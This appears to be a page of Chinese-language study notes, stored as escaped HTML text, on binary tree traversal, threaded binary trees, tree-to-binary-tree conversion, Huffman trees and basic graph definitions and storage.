<p>\u5728\u6709n\u4e2a\u7ed3\u70b9\u7684\u4e8c\u53c9\u94fe\u8868\u4e2d\uff0c\u503c\u4e3a\u975e\u7a7a\u7684\u94fe\u57df\u7684\u4e2a\u6570\u4e3an-1\u3002\u5728\u6709N\u4e2a\u7ed3\u70b9\u7684\u4e8c\u53c9\u94fe\u8868\u4e2d\u5fc5\u5b9a\u67092N\u4e2a\u94fe\u57df\u3002\u9664\u6839\u7ed3\u70b9\u5916\uff0c\u5176\u4f59N-1\u4e2a\u7ed3\u70b9\u90fd\u6709\u4e00\u4e2a\u7236\u7ed3\u70b9\u3002\u6240\u4ee5\uff0c\u4e00\u5171\u6709N-1\u4e2a\u975e\u7a7a\u94fe\u57df\uff0c\u5176\u4f592N-(N-1)=N+1\u4e2a\u4e3a\u7a7a\u94fe\u57df\u3002</p> <p>\u4e8c\u53c9\u94fe\u5b58\u50a8\u6cd5\u4e5f\u53eb\u5b69\u5b50\u5144\u5f1f\u6cd5\uff0c\u5de6\u6307\u9488\u6307\u5411\u5de6\u5b69\u5b50\uff0c\u53f3\u6307\u9488\u6307\u5411\u53f3\u5144\u5f1f\u3002\u800c\u4e2d\u5e8f\u904d\u5386\u7684\u987a\u5e8f\u662f\u5de6\u5b69\u5b50\uff0c\u6839\uff0c\u53f3\u5b69\u5b50\u3002\u8fd9\u79cd\u904d\u5386\u987a\u5e8f\u4e0e\u5b58\u50a8\u7ed3\u6784\u4e0d\u540c\uff0c\u56e0\u6b64\u9700\u8981\u5806\u6808\u4fdd\u5b58\u4e2d\u95f4\u7ed3\u679c\u3002\u800c\u4e2d\u5e8f\u904d\u5386\u68c0\u7d22\u4e8c\u53c9\u6811\u65f6\uff0c\u7531\u4e8e\u5176\u5b58\u50a8\u7ed3\u6784\u8ddf\u904d\u5386\u987a\u5e8f\u76f8\u7b26\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u7528\u5806\u6808\u3002</p> <p>\u904d\u5386\u4e8c\u53c9\u6811\u548c\u7ebf\u7d22\u4e8c\u53c9\u6811</p> <p>\u904d\u5386\u4e8c\u53c9\u6811\uff1a\u4f7f\u5f97\u6bcf\u4e00\u4e2a\u7ed3\u70b9\u5747\u88ab\u8bbf\u95ee\u4e00\u6b21\uff0c\u800c\u4e14\u4ec5\u88ab\u8bbf\u95ee\u4e00\u6b21\u3002\u975e\u9012\u5f52\u7684\u904d\u5386\u5b9e\u73b0\u8981\u5229\u7528\u6808\u3002</p> <p>\u5148\u5e8f\u904d\u5386DLR\uff1a\u6839\u8282\u70b9-&gt;\u5de6\u5b50\u6811-&gt;\u53f3\u5b50\u6811</p> <p>\u4e2d\u5e8f\u904d\u5386LDR\uff1a\u5de6\u5b50\u6811-&gt;\u6839\u8282\u70b9-&gt;\u53f3\u5b50\u6811\u3002\u5fc5\u987b\u8981\u6709\u4e2d\u5e8f\u904d\u5386\u624d\u80fd\u5f97\u5230\u4e00\u68f5\u4e8c\u53c9\u6811\u7684\u6b63\u786e\u987a\u5e8f</p> <p>\u540e\u7eed\u904d\u5386LRD\uff1a\u5de6\u5b50\u6811-&gt;\u53f3\u5b50\u6811-&gt;\u6839\u8282\u70b9\u3002\u9700\u8981\u6808\u7684\u652f\u6301\u3002</p> <p>\u5c42\u6b21\u904d\u5386\uff1a\u7528\u4e00\u7ef4\u6570\u7ec4\u5b58\u50a8\u4e8c\u53c9\u6811\u65f6,\u603b\u662f\u4ee5\u5c42\u6b21\u904d\u5386\u7684\u987a\u5e8f\u5b58\u50a8\u7ed3\u70b9\u3002\u5c42\u6b21\u904d\u5386\u5e94\u8be5\u501f\u52a9\u961f\u5217\u3002</p> <p>\u7ebf\u7d22\u4e8c\u53c9\u6811\uff1a\u5bf9\u4e8c\u53c9\u6811\u6240\u6709\u7ed3\u70b9\u505a\u67d0\u79cd\u5904\u7406\u53ef\u5728\u904d\u5386\u8fc7\u7a0b\u4e2d\u5b9e\u73b0\uff1b\u68c0\u7d22\uff08\u67e5\u627e\uff09\u4e8c\u53c9\u6811\u67d0\u4e2a\u7ed3\u70b9\uff0c\u53ef\u901a\u8fc7\u904d\u5386\u5b9e\u73b0\uff1b\u5982\u679c\u80fd\u5c06\u4e8c\u53c9\u6811\u7ebf\u7d22\u5316\uff0c\u5c31\u53ef\u4ee5\u7b80\u5316\u904d\u5386\u7b97\u6cd5\uff0c\u63d0\u9ad8\u904d\u5386\u901f\u5ea6\uff0c\u76ee\u7684\u662f\u52a0\u5feb\u67e5\u627e\u7ed3\u70b9\u7684\u524d\u9a71\u6216\u540e\u7ee7\u7684\u901f\u5ea6\u3002</p> <p>\u5982\u4f55\u7ebf\u7d22\u5316\uff1f\u4ee5\u4e2d\u5e8f\u904d\u5386\u4e3a\u4f8b\uff0c\u82e5\u80fd\u5c06\u4e2d\u5e8f\u5e8f\u5217\u4e2d\u6bcf\u4e2a\u7ed3\u70b9\u524d\u8d8b\u3001\u540e\u7ee7\u4fe1\u606f\u4fdd\u5b58\u8d77\u6765\uff0c\u4ee5\u540e\u518d\u904d\u5386\u4e8c\u53c9\u6811\u65f6\u5c31\u53ef\u4ee5\u6839\u636e\u6240\u4fdd\u5b58\u7684\u7ed3\u70b9\u524d\u8d8b\u3001\u540e\u7ee7\u4fe1\u606f\u5bf9\u4e8c\u53c9\u6811\u8fdb\u884c\u904d\u5386\u3002\u5bf9\u4e8e\u4e8c\u53c9\u6811\u7684\u7ebf\u7d22\u5316\uff0c\u5b9e\u8d28\u4e0a\u5c31\u662f\u904d\u5386\u4e00\u6b21\u4e8c\u53c9\u6811\uff0c\u53ea\u662f\u5728\u904d\u5386\u7684\u8fc7\u7a0b\u4e2d\uff0c\u68c0\u67e5\u5f53\u524d\u7ed3\u70b9\u5de6\uff0c\u53f3\u6307\u9488\u57df\u662f\u5426\u4e3a\u7a7a\uff0c\u82e5\u4e3a\u7a7a\uff0c\u5c06\u5b83\u4eec\u6539\u4e3a\u6307\u5411\u524d\u9a71\u7ed3\u70b9\u6216\u540e\u7ee7\u7ed3\u70b9\u7684\u7ebf\u7d22\u3002\u524d\u9a71\u5c31\u662f\u5728\u8fd9\u4e00\u70b9\u4e4b\u524d\u8d70\u8fc7\u7684\u70b9\uff0c\u4e0d\u662f\u4e0b\u4e00\u5c06\u8981\u53bb\u5f80\u7684\u70b9\u3002</p> <p>\u52a0\u4e0a\u7ed3\u70b9\u524d\u8d8b\u540e\u7ee7\u4fe1\u606f\uff08\u7ed3\u7d22\uff09\u7684\u4e8c\u53c9\u6811\u79f0\u4e3a\u7ebf\u7d22\u4e8c\u53c9\u6811\u3002n\u4e2a\u7ed3\u70b9\u7684\u7ebf\u7d22\u4e8c\u53c9\u6811\u4e0a\u6bcf\u4e2a\u7ed3\u70b9\u67092\u4e2a\u6307\u9488\u57df\uff08\u6307\u5411\u5de6\u5b69\u5b50\u548c\u53f3\u5b69\u5b50\uff09\uff0c\u603b\u5171\u67092n\u4e2a\u6307\u9488\u57df\uff1b\u4e00\u4e2an\u4e2a\u7ed3\u70b9\u7684\u6811\u6709n-1\u6761\u8fb9\uff0c\u90a3\u4e48\u7a7a\u6307\u9488\u57df= 2n - (n-1) = n + 1\uff0c\u5373\u7ebf\u7d22\u6570\u4e3an+1\u3002\u6307\u9488\u57dftag\u4e3a0\uff0c\u5b58\u653e\u5b69\u5b50\u6307\u9488\uff0c\u4e3a1\uff0c\u5b58\u653e\u524d\u9a71/\u540e\u7ee7\u8282\u70b9\u6307\u9488\u3002</p> <p>\u7ebf\u7d22\u6811\u4e0b\u7ed3\u70b9x\u7684\u524d\u9a71\u4e0e\u540e\u7ee7\u67e5\u627e\uff1a\u8bbe\u7ed3\u70b9x\u76f8\u5e94\u7684\u5de6\uff08\u53f3\uff09\u6807\u5fd7\u662f\u7ebf\u7d22\u6807\u5fd7\uff0c\u5219lchild(rchild)\u5c31\u662f\u524d\u9a71(\u540e\u7ee7\uff09\uff0c\u5426\u5219\uff1a</p> <p>LDR\u2013\u524d\u9a71\uff1a\u5de6\u5b50\u6811\u4e2d\u6700\u9760\u53f3\u8fb9\u7684\u7ed3\u70b9\uff1b\u540e\u7ee7\uff1a\u53f3\u5b50\u6811\u4e2d\u6700\u9760\u5de6\u8fb9\u7684\u7ed3\u70b9</p> <p>LRD\u2013\u524d\u9a71\uff1a\u53f3\u5b50\u6811\u7684\u6839\uff0c\u82e5\u65e0\u53f3\u5b50\u6811\uff0c\u4e3a\u5de6\u5b50\u6811\u8ddf\u3002\u540e\u7ee7\uff1ax\u662f\u6839\uff0c\u540e\u7ee7\u662f\u7a7a\uff1bx\u662f\u53cc\u4eb2\u7684\u53f3\u5b69\u5b50\u3001x\u662f\u53cc\u4eb2\u7684\u5de6\u5b69\u5b50\uff0c\u4f46\u53cc\u4eb2\u65e0\u53f3\u5b69\u5b50\uff0c\u53cc\u4eb2\u662f\u540e\u7ee7\uff1bx\u662f\u53cc\u4eb2\u7684\u5de6\u5b69\u5b50\uff0c\u53cc\u4eb2\u6709\u53f3\u5b69\u5b50\uff0c\u53cc\u4eb2\u53f3\u5b50\u6811\u4e2d\u6700\u5de6\u7684\u53f6\u5b50\u662f\u540e\u7ee7</p> <p>DLR\u2013\u5bf9\u79f0\u4e8eLRD\u7ebf\u7d22\u6811\u2014\u5c06LRD\u4e2d\u6240\u6709\u5de6\u53f3\u4e92\u6362\uff0c\u524d\u9a71\u4e0e\u540e\u7ee7\u4e92\u6362\uff0c\u5f97\u5230DLR\u7684\u65b9\u6cd5\u3002</p> <p>\u4e3a\u7b80\u5316\u7ebf\u7d22\u94fe\u8868\u7684\u904d\u5386\u7b97\u6cd5\uff0c\u4eff\u7167\u7ebf\u6027\u94fe\u8868\uff0c\u4e3a\u7ebf\u7d22\u94fe\u8868\u52a0\u4e0a\u4e00\u5934\u7ed3\u70b9\uff0c\u7ea6\u5b9a\uff1a </p> <p>\u5934\u7ed3\u70b9\u7684lchild\u57df\uff1a\u5b58\u653e\u7ebf\u7d22\u94fe\u8868\u7684\u6839\u7ed3\u70b9\u6307\u9488\uff1b</p> <p>\u5934\u7ed3\u70b9\u7684rchild\u57df: \u4e2d\u5e8f\u5e8f\u5217\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u7684\u6307\u9488\uff1b</p> <p>\u4e2d\u5e8f\u5e8f\u5217\u7b2c\u4e00\u7ed3\u70b9lchild\u57df\u6307\u5411\u5934\u7ed3\u70b9;</p> <p>\u4e2d\u5e8f\u5e8f\u5217\u6700\u540e\u4e00\u4e2a\u7ed3\u70b9\u7684rchild\u57df\u6307\u5411\u5934\u7ed3\u70b9;</p> <p>\u4e2d\u5e8f\u904d\u5386\u7684\u7ebf\u7d22\u4e8c\u53c9\u6811\u4ee5\u53ca\u7ebf\u7d22\u4e8c\u53c9\u6811\u94fe\u8868\u793a\u610f\u56fe </p> <p>\u4e00\u68f5\u5de6\u53f3\u5b50\u6811\u5747\u4e0d\u7a7a\u7684\u4e8c\u53c9\u6811\u5728\u524d\u5e8f\u7ebf\u7d22\u5316\u540e,\u5176\u4e2d\u7a7a\u7684\u94fe\u57df\u7684\u4e2a\u6570\u662f1\u3002\u524d\u5e8f\u548c\u540e\u7eed\u7ebf\u7d22\u5316\u540e\u7a7a\u94fe\u57df\u4e2a\u6570\u90fd\u662f1\uff0c\u4e2d\u5e8f\u662f2\u3002\u4e8c\u53c9\u6811\u5728\u7ebf\u7d22\u5316\u540e\uff0c\u4ecd\u4e0d\u80fd\u6709\u6548\u6c42\u89e3\u7684\u95ee\u9898\u662f\u524d\u5e8f\u6c42\u524d\u5e8f\u5148\u9a71\uff0c\u540e\u5e8f\u6c42\u540e\u5e8f\u540e\u7ee7\u3002</p> <p>\u4e2d\u5e8f\u904d\u5386\u7684\u987a\u5e8f\u4e3a\uff1a\u5de6\u3001\u6839\u3001\u53f3\uff0c\u6240\u4ee5\u5bf9\u4e8e\u6bcf\u4e00\u975e\u7a7a\u7684\u7ebf\u7d22\uff0c\u5de6\u5b50\u6811\u7ed3\u70b9\u7684\u540e\u7ee7\u4e3a\u6839\u7ed3\u70b9\uff0c\u53f3\u5b50\u6811\u7ed3\u70b9\u7684\u524d\u9a71\u4e3a\u6839\u7ed3\u70b9\uff0c\u518d\u9012\u5f52\u7684\u6267\u884c\u4e0a\u9762\u7684\u8fc7\u7a0b\uff0c\u53ef\u5f97\u975e\u7a7a\u7ebf\u7d22\u5747\u6307\u5411\u5176\u7956\u5148\u7ed3\u70b9\u3002\u5728\u4e2d\u5e8f\u7ebf\u7d22\u4e8c\u53c9\u6811\u4e2d,\u6bcf\u4e00\u975e\u7a7a\u7684\u7ebf\u7d22\u5747\u6307\u5411\u5176\u7956\u5148\u7ed3\u70b9\u3002</p> <p>\u5728\u4e8c\u53c9\u6811\u4e0a\u52a0\u4e0a\u7ed3\u70b9\u524d\u8d8b\u3001\u540e\u7ee7\u7ebf\u7d22\u540e\uff0c\u53ef\u5229\u7528\u7ebf\u7d22\u5bf9\u4e8c\u53c9\u6811\u8fdb\u884c\u904d\u5386,\u6b64\u65f6\uff0c\u4e0d\u9700\u6808\uff0c\u4e5f\u4e0d\u9700\u9012\u5f52\u3002\u57fa\u672c\u6b65\u9aa4\uff1a</p> <p>p=T-&gt;lchild; p\u6307\u5411\u7ebf\u7d22\u94fe\u8868\u7684\u6839\u7ed3\u70b9\uff1b</p> <p>\u82e5\u7ebf\u7d22\u94fe\u8868\u975e\u7a7a\uff0c\u5faa\u73af\uff1a </p> <p>\u5faa\u73af\uff0c\u987a\u7740p\u5de6\u5b69\u5b50\u6307\u9488\u627e\u5230\u6700\u5de6\u4e0b\u7ed3\u70b9\uff1b\u8bbf\u95ee\u4e4b\uff1b </p> <p>\u82e5p\u6240\u6307\u7ed3\u70b9\u7684\u53f3\u5b69\u5b50\u57df\u4e3a\u7ebf\u7d22\uff0cp\u7684\u53f3\u5b69\u5b50\u7ed3\u70b9\u5373\u4e3a\u540e\u7ee7\u7ed3\u70b9\u5faa\u73af\uff1a p=p-&gt;rchild\uff1b \u5e76\u8bbf\u95eep\u6240\u6307\u7ed3\u70b9\uff1b\uff08\u5728\u6b64\u5faa\u73af\u4e2d\uff0c\u987a\u7740\u540e\u7ee7\u7ebf\u7d22\u8bbf\u95ee\u4e8c\u53c9\u6811\u4e2d\u7684\u7ed3\u70b9\uff09</p> <p>\u4e00\u65e6\u7ebf\u7d22\u201c\u4e2d\u65ad\u201d\uff0cp\u6240\u6307\u7ed3\u70b9\u7684\u53f3\u5b69\u5b50\u57df\u4e3a\u53f3\u5b69\u5b50\u6307\u9488\uff0cp=p-&gt;rchild\uff0c\u4f7f p\u6307\u5411\u53f3\u5b69\u5b50\u7ed3\u70b9\uff1b</p> <p>\u6811\u548c\u68ee\u6797</p> <p>\u6811\u7684\u5b58\u50a8\u7ed3\u6784\uff1a</p> <p>\u53cc\u4eb2\u8868\u793a\u6cd5</p> <p>\u5b69\u5b50\u8868\u793a\u6cd5</p> <p>\u5229\u7528\u56fe\u8868\u793a\u6811</p> <p>\u5b69\u5b50\u5144\u5f1f\u8868\u793a\u6cd5\uff08\u4e8c\u53c9\u6811\u8868\u793a\u6cd5\uff09\uff1a\u94fe\u8868\u4e2d\u6bcf\u4e2a\u7ed3\u70b9\u7684\u4e24\u6307\u9488\u57df\u5206\u522b\u6307\u5411\u5176\u7b2c\u4e00\u4e2a\u5b69\u5b50\u7ed3\u70b9\u548c\u4e0b\u4e00\u4e2a\u5144\u5f1f\u7ed3\u70b9</p> <p>\u5c06\u6811\u8f6c\u5316\u6210\u4e8c\u53c9\u6811\uff1a\u53f3\u5b50\u6811\u4e00\u5b9a\u4e3a\u7a7a</p> <p>\u52a0\u7ebf\uff1a\u5728\u5144\u5f1f\u4e4b\u95f4\u52a0\u4e00\u8fde\u7ebf</p> <p>\u62b9\u7ebf\uff1a\u5bf9\u6bcf\u4e2a\u7ed3\u70b9\uff0c\u9664\u4e86\u5176\u5de6\u5b69\u5b50\u5916\uff0c\u53bb\u9664\u5176\u4e0e\u5176\u4f59\u5b69\u5b50\u4e4b\u95f4\u7684\u5173\u7cfb</p> <p>\u65cb\u8f6c\uff1a\u4ee5\u6811\u7684\u6839\u7ed3\u70b9\u4e3a\u8f74\u5fc3\uff0c\u5c06\u6574\u6811\u987a\u65f6\u9488\u8f6c45\u00b0</p> <p>\u68ee\u6797\u8f6c\u6362\u6210\u4e8c\u53c9\u6811\uff1a</p> <p>\u5c06\u5404\u68f5\u6811\u5206\u522b\u8f6c\u6362\u6210\u4e8c\u53c9\u6811</p> <p>\u5c06\u6bcf\u68f5\u6811\u7684\u6839\u7ed3\u70b9\u7528\u7ebf\u76f8\u8fde</p> <p>\u4ee5\u7b2c\u4e00\u68f5\u6811\u6839\u7ed3\u70b9\u4e3a\u4e8c\u53c9\u6811\u7684\u6839</p> <p>\u6811\u4e0e\u8f6c\u6362\u540e\u7684\u4e8c\u53c9\u6811\u7684\u5173\u7cfb\uff1a\u8f6c\u6362\u540e\u7684\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u5bf9\u5e94\u6811\u7684\u5148\u5e8f\u904d\u5386\uff1b\u8f6c\u6362\u540e\u7684\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u5bf9\u5e94\u6811\u7684\u540e\u5e8f\u904d\u5386</p> <p>\u54c8\u5f17\u66fc\u6811/\u970d\u592b\u66fc\u6811</p> <p>\u4e00\u4e9b\u6982\u5ff5</p> <p>\u8def\u5f84\uff1a\u4ece\u4e00\u4e2a\u7956\u5148\u7ed3\u70b9\u5230\u5b50\u5b59\u7ed3\u70b9\u4e4b\u95f4\u7684\u5206\u652f\u6784\u6210\u8fd9\u4e24\u4e2a\u7ed3\u70b9\u95f4\u7684\u8def\u5f84\uff1b</p> <p>\u8def\u5f84\u957f\u5ea6\uff1a\u8def\u5f84\u4e0a\u7684\u5206\u652f\u6570\u76ee\u79f0\u4e3a\u8def\u5f84\u957f\u5ea6\uff1b</p> <p>\u6811\u7684\u8def\u5f84\u957f\u5ea6\uff1a\u4ece\u6839\u5230\u6bcf\u4e2a\u7ed3\u70b9\u7684\u8def\u5f84\u957f\u5ea6\u4e4b\u548c\u3002</p> <p>\u7ed3\u70b9\u7684\u6743\uff1a\u6839\u636e\u5e94\u7528\u7684\u9700\u8981\u53ef\u4ee5\u7ed9\u6811\u7684\u7ed3\u70b9\u8d4b\u6743\u503c\uff1b</p> <p>\u7ed3\u70b9\u7684\u5e26\u6743\u8def\u5f84\u957f\u5ea6\uff1a\u4ece\u6839\u5230\u8be5\u7ed3\u70b9\u7684\u8def\u5f84\u957f\u5ea6\u4e0e\u8be5\u7ed3\u70b9\u6743\u7684\u4e58\u79ef\uff1b</p> <p>\u6811\u7684\u5e26\u6743\u8def\u5f84\u957f\u5ea6=\u6811\u4e2d\u6240\u6709\u53f6\u5b50\u7ed3\u70b9\u7684\u5e26\u6743\u8def\u5f84\u4e4b\u548c\uff1b\u901a\u5e38\u8bb0\u4f5c  WPL=\u2211wi\u00d7li </p> <p>\u54c8\u592b\u66fc\u6811\uff1a\u5047\u8bbe\u6709n\u4e2a\u6743\u503c(w1,  w2, \u2026 , wn)\uff0c\u6784\u9020\u6709n\u4e2a\u53f6\u5b50\u7ed3\u70b9\u7684\u4e8c\u53c9\u6811\uff0c\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u6709\u4e00\u4e2a wi\u4f5c\u4e3a\u5b83\u7684\u6743\u503c\u3002\u5219\u5e26\u6743\u8def\u5f84\u957f\u5ea6\u6700\u5c0f\u7684\u4e8c\u53c9\u6811\u79f0\u4e3a\u54c8\u592b\u66fc\u6811\u3002\u6700\u4f18\u4e8c\u53c9\u6811\u3002</p> <p>\u524d\u7f00\u7801\u7684\u5b9a\u4e49\uff1a\u5728\u4e00\u4e2a\u5b57\u7b26\u96c6\u4e2d\uff0c\u4efb\u4f55\u4e00\u4e2a\u5b57\u7b26\u7684\u7f16\u7801\u90fd\u4e0d\u662f\u53e6\u4e00\u4e2a\u5b57\u7b26\u7f16\u7801\u7684\u524d\u7f00\u3002\u970d\u592b\u66fc\u7f16\u7801\u5c31\u662f\u524d\u7f00\u7801\uff0c\u53ef\u7528\u4e8e\u5feb\u901f\u5224\u65ad\u970d\u592b\u66fc\u7f16\u7801\u662f\u5426\u6b63\u786e\u3002\u970d\u592b\u66fc\u6811\u662f\u6ee1\u4e8c\u53c9\u6811\uff0c\u82e5\u6709n\u4e2a\u8282\u70b9\uff0c\u5219\u5171\u6709(n+1)/2\u4e2a\u7801\u5b50</p> <p>\u7ed9\u5b9an\u4e2a\u6743\u503c\u4f5c\u4e3an\u7684\u53f6\u5b50\u7ed3\u70b9\uff0c\u6784\u9020\u4e00\u68f5\u4e8c\u53c9\u6811\uff0c\u82e5\u5e26\u6743\u8def\u5f84\u957f\u5ea6\u8fbe\u5230\u6700\u5c0f\uff0c\u79f0\u8fd9\u6837\u7684\u4e8c\u53c9\u6811\u4e3a\u6700\u4f18\u4e8c\u53c9\u6811\uff0c\u4e5f\u79f0\u4e3a\u970d\u592b\u66fc\u6811(Huffman Tree)\u3002\u970d\u592b\u66fc\u6811\u662f\u5e26\u6743\u8def\u5f84\u957f\u5ea6\u6700\u77ed\u7684\u6811\uff0c\u6743\u503c\u8f83\u5927\u7684\u7ed3\u70b9\u79bb\u6839\u8f83\u8fd1\u3002</p> <p>\u5047\u8bbe\u54c8\u592b\u66fc\u6811\u662f\u4e8c\u53c9\u7684\u8bdd\uff0c\u5219\u5ea6\u4e3a0\u7684\u7ed3\u70b9\u4e2a\u6570\u4e3aN\uff0c\u5ea6\u4e3a2\u7684\u7ed3\u70b9\u4e2a\u6570\u4e3aN-1\uff0c\u5219\u7ed3\u70b9\u603b\u6570\u4e3a2N-1\u3002\u54c8\u592b\u66fc\u6811\u7684\u7ed3\u70b9\u4e2a\u6570\u5fc5\u4e3a\u5947\u6570\u3002</p> <p>\u54c8\u592b\u66fc\u6811\u4e0d\u4e00\u5b9a\u662f\u5b8c\u5168\u4e8c\u53c9\u6811\uff0c\u4f46\u4e00\u5b9a\u662f\u6700\u4f18\u4e8c\u53c9\u6811\u3002</p> <p>\u82e5\u5ea6\u4e3am\u7684\u54c8\u592b\u66fc\u6811\u4e2d,\u5176\u53f6\u7ed3\u70b9\u4e2a\u6570\u4e3an,\u5219\u975e\u53f6\u7ed3\u70b9\u7684\u4e2a\u6570\u4e3a[(n-1)/(m-1)]\u3002\u8fb9\u7684\u6570\u76ee\u7b49\u4e8e\u5ea6\u3002</p> <p>\u56fe\u904d\u5386\u4e0e\u56de\u6eaf</p> <p>\u56fe\u641c\u7d22-&gt;\u5f62\u6210\u641c\u7d22\u6811</p> <p>\u7a77\u4e3e\u6cd5\u3002</p> <p>\u8d2a\u5fc3\u6cd5\u3002\u591a\u6b65\u51b3\u7b56\uff0c\u6bcf\u6b65\u9009\u62e9\u4f7f\u5f97\u6784\u6210\u4e00\u4e2a\u95ee\u9898\u7684\u53ef\u80fd\u89e3\uff0c\u540c\u65f6\u6ee1\u8db3\u76ee\u6807\u51fd\u6570\u3002</p> <p>\u56de\u6eaf\u6cd5\u3002\u6839\u636e\u9898\u610f\uff0c\u9009\u53d6\u5ea6\u91cf\u6807\u51c6\uff0c\u7136\u540e\u5c06\u53ef\u80fd\u7684\u9009\u62e9\u65b9\u6cd5\u6309\u5ea6\u91cf\u6807\u51c6\u6240\u8981\u6c42\u987a\u5e8f\u6392\u597d\uff0c\u6bcf\u6b21\u5904\u7406\u4e00\u4e2a\u91cf\uff0c\u5f97\u5230\u8be5\u610f\u4e49\u4e0b\u7684\u6700\u4f18\u89e3\u7684\u5206\u89e3\u5904\u7406\u3002</p> <p>\u56fe</p> <p>\u65e0\u5411\u56fe</p> <p>\u56de\u8def\u6216\u73af\uff1a\u7b2c\u4e00\u4e2a\u9876\u70b9\u548c\u6700\u540e\u4e00\u4e2a\u9876\u70b9\u76f8\u540c\u7684\u8def\u5f84\u3002</p> <p>\u7b80\u5355\u56de\u8def\u6216\u7b80\u5355\u73af\uff1a\u9664\u7b2c\u4e00\u4e2a\u9876\u70b9\u548c\u6700\u540e\u4e00\u4e2a\u9876\u70b9\u4e4b\u5916\uff0c\u5176\u4f59\u9876\u70b9\u4e0d\u91cd\u590d\u51fa\u73b0\u7684\u56de\u8def</p> <p>\u8fde\u901a\uff1a\u9876\u70b9v\u81f3v\u2019 \u4e4b\u95f4\u6709\u8def\u5f84\u5b58\u5728</p> <p>\u8fde\u901a\u56fe\uff1a\u65e0\u5411\u56fe\u56fe G \u7684\u4efb\u610f\u4e24\u70b9\u4e4b\u95f4\u90fd\u662f\u8fde\u901a\u7684\uff0c\u5219\u79f0G\u662f\u8fde\u901a\u56fe\u3002</p> <p>\u8fde\u901a\u5206\u91cf\uff1a\u6781\u5927\u8fde\u901a\u5b50\u56fe\uff0c\u5b50\u56fe\u4e2d\u5305\u542b\u7684\u9876\u70b9\u4e2a\u6570\u6781\u5927</p> <p>\u6240\u6709\u9876\u70b9\u5ea6\u7684\u548c\u5fc5\u987b\u4e3a\u5076\u6570</p> <p>\u6709\u5411\u56fe\uff1a</p> <p>\u56de\u8def\u6216\u73af\uff1a\u7b2c\u4e00\u4e2a\u9876\u70b9\u548c\u6700\u540e\u4e00\u4e2a\u9876\u70b9\u76f8\u540c\u7684\u8def\u5f84\u3002</p> <p>\u7b80\u5355\u56de\u8def\u6216\u7b80\u5355\u73af\uff1a\u9664\u7b2c\u4e00\u4e2a\u9876\u70b9\u548c\u6700\u540e\u4e00\u4e2a\u9876\u70b9\u4e4b\u5916\uff0c\u5176\u4f59\u9876\u70b9\u4e0d\u91cd\u590d\u51fa\u73b0\u7684\u56de\u8def\u3002</p> <p>\u8fde\u901a\uff1a\u9876\u70b9v\u81f3v\u2019\u4e4b\u95f4\u6709\u8def\u5f84\u5b58\u5728</p> <p>\u5f3a\u8fde\u901a\u56fe\uff1a\u6709\u5411\u56feG\u7684\u4efb\u610f\u4e24\u70b9\u4e4b\u95f4\u90fd\u662f\u8fde\u901a\u7684\uff0c\u5219\u79f0G\u662f\u5f3a\u8fde\u901a\u56fe\u3002\u5404\u4e2a\u9876\u70b9\u95f4\u5747\u53ef\u8fbe\u3002</p> <p>\u5f3a\u8fde\u901a\u5206\u91cf\uff1a\u6781\u5927\u8fde\u901a\u5b50\u56fe</p> <p>\u6709\u5411\u56fe\u9876\u70b9\u7684\u5ea6\u662f\u9876\u70b9\u7684\u5165\u5ea6\u4e0e\u51fa\u5ea6\u4e4b\u548c\u3002\u90bb\u63a5\u77e9\u9635\u4e2d\u7b2cV\u884c\u4e2d\u76841\u7684\u4e2a\u6570\u662fV\u7684\u51fa\u5ea6</p> <p>\u751f\u6210\u6811\uff1a\u6781\u5c0f\u8fde\u901a\u5b50\u56fe\u3002\u5305\u542b\u56fe\u7684\u6240\u6709n\u4e2a\u7ed3\u70b9\uff0c\u4f46\u53ea\u542b\u56fe\u7684n-1\u6761\u8fb9\u3002\u5728\u751f\u6210\u6811\u4e2d\u6dfb\u52a0\u4e00\u6761\u8fb9\u4e4b\u540e\uff0c\u5fc5\u5b9a\u4f1a\u5f62\u6210\u56de\u8def\u6216\u73af\u3002</p> <p>\u5b8c\u5168\u56fe\uff1a\u6709 n(n-1)/2 \u6761\u8fb9\u7684\u65e0\u5411\u56fe\u3002\u5176\u4e2dn\u662f\u7ed3\u70b9\u4e2a\u6570\u3002\u5fc5\u5b9a\u662f\u8fde\u901a\u56fe\u3002</p> <p>\u6709\u5411\u5b8c\u5168\u56fe\uff1a\u6709n(n-1)\u6761\u8fb9\u7684\u6709\u5411\u56fe\u3002\u5176\u4e2dn\u662f\u7ed3\u70b9\u4e2a\u6570\u3002\u6bcf\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u90fd\u6709\u4e24\u6761\u65b9\u5411\u76f8\u53cd\u7684\u8fb9\u8fde\u63a5\u7684\u56fe\u3002</p> <p>\u4e00\u4e2a\u65e0\u5411\u56fe G=(V,E) \u662f\u8fde\u901a\u7684\uff0c\u90a3\u4e48\u8fb9\u7684\u6570\u76ee\u5927\u4e8e\u7b49\u4e8e\u9876\u70b9\u7684\u6570\u76ee\u51cf\u4e00\uff1a|E|&gt;=|V|-1\uff0c\u800c\u53cd\u4e4b\u4e0d\u6210\u7acb\u3002\u5982\u679c G=(V,E) \u662f\u6709\u5411\u56fe\uff0c\u90a3\u4e48\u5b83\u662f\u5f3a\u8fde\u901a\u56fe\u7684\u5fc5\u8981\u6761\u4ef6\u662f\u8fb9\u7684\u6570\u76ee\u5927\u4e8e\u7b49\u4e8e\u9876\u70b9\u7684\u6570\u76ee\uff1a|E|&gt;=|V|\uff0c\u800c\u53cd\u4e4b\u4e0d\u6210\u7acb\u3002\u6ca1\u6709\u56de\u8def\u7684\u65e0\u5411\u56fe\u662f\u8fde\u901a\u7684\u5f53\u4e14\u4ec5\u5f53\u5b83\u662f\u6811\uff0c\u5373\u7b49\u4ef7\u4e8e\uff1a|E|=|V|-1\u3002</p> <p>\u56fe\u7684\u5b58\u50a8\u5f62\u5f0f</p> <p>\u90bb\u63a5\u77e9\u9635\u548c\u52a0\u6743\u90bb\u63a5\u77e9\u9635 </p> <p>\u65e0\u6743\u6709\u5411\u56fe\uff1a\u51fa\u5ea6: i\u884c\u4e4b\u548c\uff1b\u5165\u5ea6: j\u5217\u4e4b\u548c\u3002</p> <p>\u65e0\u6743\u65e0\u5411\u56fe\uff1ai\u7ed3\u70b9\u7684\u5ea6: i\u884c\u6216i\u5217\u4e4b\u548c\u3002</p> 